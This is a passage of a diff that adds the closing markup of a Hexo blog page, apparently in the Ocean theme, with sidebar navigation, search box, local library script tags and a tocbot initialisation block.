+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Melon"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
